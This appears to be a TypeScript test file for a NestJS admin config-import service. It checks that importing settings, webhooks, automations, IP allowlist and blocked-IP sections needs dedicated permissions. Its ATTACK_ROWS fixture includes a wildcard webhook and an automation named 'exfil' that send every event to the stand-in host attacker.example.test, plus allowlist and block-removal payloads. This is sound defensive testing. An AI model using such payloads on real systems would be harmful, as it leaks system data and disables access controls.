import 'reflect-metadata';

import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { BadRequestException } from '@nestjs/common';

import {
  ConfigExportPayloadInterface,
  ConfigExportSection,
} from '../src/modules/config-portability/services/config-export.service';
import { ConfigImportService } from '../src/modules/config-portability/services/config-import.service';

/**
 * `config_portability:import` was a superset of five other permissions
 * ───────────────────────────────────────────────────────────────────
 * The endpoint's only gate was `config_portability:import`. `roles` and
 * `permissions` were already behind `rbac_roles:edit` on top of it — that part
 * was right, and the last suite here exists to make sure it stays right. Five
 * other sections carried security state with no gate at all:
 *
 *   settings         — patch the whole singleton: AI gate and API key,
 *                      Turnstile, anti-fraud tunables, platform policy, the
 *                      backup Telegram chat id, the encrypted bot token
 *   webhooks         — a subscription on `eventTypes: ['*']` pointing at an
 *                      attacker URL: every system event's metadata leaves
 *   automations      — `actions` is arbitrary JSON and `webhook_post` POSTs to
 *                      ANY url with an operator-supplied Authorization header
 *   adminIpAllowlist — add your own IP; and since the allowlist opens fully at
 *                      zero active entries, an overwrite disables it outright
 *   blockedIps       — deactivate a block
 *
 * Each test below is the actual attack, run by an admin holding
 * `config_portability:import` and nothing else.
 */

/** The rows an attacker would put in each section. */
const ATTACK_ROWS: Readonly<Partial<Record<ConfigExportSection, Record<string, unknown>[]>>> = {
  settings: [{ id: 1, aiSupportSettings: { enabled: true, apiKeyEnc: 'attacker-key' } }],
  webhooks: [
    {
      id: 'wh-evil',
      name: 'ops',
      url: 'https://attacker.example.test/collect',
      secret: 'attacker-chosen',
      eventTypes: ['*'],
      isActive: true,
    },
  ],
  automations: [
    {
      id: 'auto-evil',
      name: 'exfil',
      isEnabled: true,
      triggerKind: 'REALTIME',
      triggerSpec: '*',
      actions: [
        {
          type: 'webhook_post',
          params: { url: 'https://attacker.example.test/collect', authorizationHeader: 'Bearer x' },
        },
      ],
    },
  ],
  adminIpAllowlist: [{ id: 'ip-1', address: '203.0.113.7/32', label: 'mine', isActive: false }],
  blockedIps: [{ id: 'blocked-1', address: '203.0.113.7', source: 'manual', reason: null }],
};

/** The permission(s) each gated section now demands, on top of the endpoint's own. */
const REQUIRED: Readonly<Partial<Record<ConfigExportSection, readonly string[]>>> = {
  settings: ['settings:edit'],
  webhooks: ['webhooks:create', 'webhooks:edit'],
  automations: ['automations:create', 'automations:edit'],
  adminIpAllowlist: ['admins:edit'],
  blockedIps: ['blocked_ips:create', 'blocked_ips:delete'],
};

const GATED_SECTIONS = Object.keys(REQUIRED) as ConfigExportSection[];

function payloadFor(section: ConfigExportSection): ConfigExportPayloadInterface {
  const rows = ATTACK_ROWS[section] ?? [];
  return {
    version: 1,
    exportedAt: '2026-01-01T00:00:00.000Z',
    source: 'rezeis-admin',
    manifest: { [section]: rows.length },
    sections: { [section]: rows },
  };
}

/**
 * Prisma stub that RECORDS every write. The gate is only proven by the absence
 * of writes: an implementation that threw after touching the row would pass a
 * test that only checked for a rejection.
 */
function buildRecordingStub() {
  const writes: string[] = [];
  const delegate = (name: string) => ({
    findUnique: async () => null,
    findFirst: async () => null,
    create: async () => {
      writes.push(`${name}.create`);
      return {};
    },
    update: async () => {
      writes.push(`${name}.update`);
      return {};
    },
  });
  const tx = {
    adminRole: delegate('adminRole'),
    adminPermission: delegate('adminPermission'),
    adminScopePolicy: delegate('adminScopePolicy'),
    automationRule: delegate('automationRule'),
    webhookSubscription: delegate('webhookSubscription'),
    notificationTemplate: delegate('notificationTemplate'),
    settings: delegate('settings'),
    blockedIp: delegate('blockedIp'),
    adminIpAllowlist: delegate('adminIpAllowlist'),
    faqItem: delegate('faqItem'),
    legalDocument: delegate('legalDocument'),
  };
  const prisma = {
    $transaction: async (fn: (client: typeof tx) => Promise<unknown>) => fn(tx),
  };
  return { prisma, writes };
}

describe('config import — each security-bearing section needs its own permission', () => {
  for (const section of GATED_SECTIONS) {
    const tokens = REQUIRED[section] ?? [];

    it(`refuses "${section}" from an admin holding only config_portability:import`, async () => {
      const { prisma, writes } = buildRecordingStub();
      const service = new ConfigImportService(prisma as never);

      await assert.rejects(
        () =>
          service.importConfig({
            payload: payloadFor(section),
            sections: [section],
            strategy: 'overwrite',
            dryRun: false,
            importerPermissions: new Set(['config_portability:import']),
          }),
        (err: unknown) => {
          assert.ok(err instanceof BadRequestException, `expected 400, got ${String(err)}`);
          assert.match(err.message, new RegExp(section));
          for (const token of tokens) {
            assert.match(err.message, new RegExp(token.replace(':', ':')));
          }
          return true;
        },
      );
      assert.deepEqual(writes, [], `nothing may be written for "${section}"`);
    });

    it(`refuses "${section}" from an admin holding only SOME of ${tokens.join(' + ')}`, async () => {
      if (tokens.length < 2) return; // single-token sections have no partial case
      const { prisma, writes } = buildRecordingStub();
      const service = new ConfigImportService(prisma as never);
      const partial = new Set(['config_portability:import', tokens[0] as string]);

      await assert.rejects(
        () =>
          service.importConfig({
            payload: payloadFor(section),
            sections: [section],
            strategy: 'overwrite',
            dryRun: false,
            importerPermissions: partial,
          }),
        (err: unknown) => err instanceof BadRequestException,
      );
      assert.deepEqual(writes, []);
    });

    it(`allows "${section}" once the admin holds ${tokens.join(' + ')}`, async () => {
      const { prisma, writes } = buildRecordingStub();
      const service = new ConfigImportService(prisma as never);

      const result = await service.importConfig({
        payload: payloadFor(section),
        sections: [section],
        strategy: 'overwrite',
        dryRun: false,
        importerPermissions: new Set(['config_portability:import', ...tokens]),
      });

      const summary = result.summaries.find((entry) => entry.section === section);
      assert.equal(summary?.status, 'imported', `"${section}" should import for a permitted admin`);
      assert.ok(writes.length > 0, 'a permitted import must actually write');
    });
  }

  it('refuses a dry run too — previewing a change is still deciding one', async () => {
    // `dryRun` rolls back, so nothing persists. But the summary reports what
    // WOULD happen section by section, which is reconnaissance, and letting it
    // through would leave the gate readable as "you may look".
    const { prisma } = buildRecordingStub();
    const service = new ConfigImportService(prisma as never);

    await assert.rejects(
      () =>
        service.importConfig({
          payload: payloadFor('webhooks'),
          sections: ['webhooks'],
          strategy: 'overwrite',
          dryRun: true,
          importerPermissions: new Set(['config_portability:import']),
        }),
      (err: unknown) => err instanceof BadRequestException,
    );
  });

  it('does not arm a gate for a section that is absent or empty', async () => {
    // A deliberate subset export must stay importable by an admin who is not a
    // superadmin: sections the file says nothing about change nothing.
    const { prisma } = buildRecordingStub();
    const service = new ConfigImportService(prisma as never);

    const result = await service.importConfig({
      payload: {
        version: 1,
        exportedAt: '2026-01-01T00:00:00.000Z',
        source: 'rezeis-admin',
        manifest: { faqItems: 0, webhooks: 0 },
        sections: { faqItems: [], webhooks: [] },
      },
      sections: ['faqItems', 'webhooks'],
      strategy: 'overwrite',
      dryRun: false,
      importerPermissions: new Set(['config_portability:import']),
    });

    assert.equal(result.summaries.find((s) => s.section === 'webhooks')?.status, 'imported');
    assert.equal(result.summaries.find((s) => s.section === 'faqItems')?.status, 'imported');
  });
});

describe('config import — the RBAC gate that was already right stays right', () => {
  it('still refuses roles without rbac_roles:edit', async () => {
    const { prisma, writes } = buildRecordingStub();
    const service = new ConfigImportService(prisma as never);

    await assert.rejects(
      () =>
        service.importConfig({
          payload: {
            version: 1,
            exportedAt: '2026-01-01T00:00:00.000Z',
            source: 'rezeis-admin',
            manifest: { roles: 1 },
            sections: { roles: [{ id: 'role-1', name: 'evil', displayName: 'Evil' }] },
          },
          sections: ['roles'],
          strategy: 'overwrite',
          dryRun: false,
          importerPermissions: new Set(['config_portability:import']),
        }),
      (err: unknown) => {
        assert.ok(err instanceof BadRequestException);
        assert.match(err.message, /rbac_roles:edit/);
        return true;
      },
    );
    assert.deepEqual(writes, []);
  });

  it('still refuses to import a grant the importer does not itself hold', async () => {
    // The self-escalation guard: an admin with rbac_roles:edit but not
    // admins:delete cannot mint admins:delete through a crafted payload.
    const { prisma, writes } = buildRecordingStub();
    const service = new ConfigImportService(prisma as never);

    const result = await service.importConfig({
      payload: {
        version: 1,
        exportedAt: '2026-01-01T00:00:00.000Z',
        source: 'rezeis-admin',
        manifest: { permissions: 1 },
        sections: {
          permissions: [
            { id: 'p-1', roleId: 'role-1', resource: 'admins', action: 'delete' },
          ],
        },
      },
      sections: ['permissions'],
      strategy: 'overwrite',
      dryRun: false,
      importerPermissions: new Set(['config_portability:import', 'rbac_roles:edit']),
    });

    const summary = result.summaries.find((entry) => entry.section === 'permissions');
    assert.equal(summary?.skipped, 1, 'the grant must be skipped, not created');
    assert.deepEqual(writes, []);
  });
});
